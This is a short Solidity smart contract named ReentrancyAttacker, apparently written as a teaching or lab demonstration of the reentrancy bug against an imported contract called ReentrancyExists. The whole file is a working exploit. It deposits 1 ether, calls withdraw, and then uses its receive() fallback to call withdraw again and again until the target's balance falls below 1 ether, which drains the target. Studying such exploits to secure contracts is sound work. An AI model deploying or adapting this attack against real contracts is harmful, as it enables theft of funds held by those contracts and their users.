// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 < 0.9.0;

import "./ReentrancyExists.sol";

contract ReentrancyAttacker {

    ReentrancyExists public targetContract;

    constructor(address _addr) {
        targetContract = ReentrancyExists(_addr);
    }
 
    function attack() external payable {
        require(msg.value >= 1 ether);
        targetContract.deposit{value: 1 ether}();
        targetContract.withdraw();
    }

    receive() external payable {
        if(address(targetContract).balance >= 1 ether) {
            targetContract.withdraw();
        }
    }

}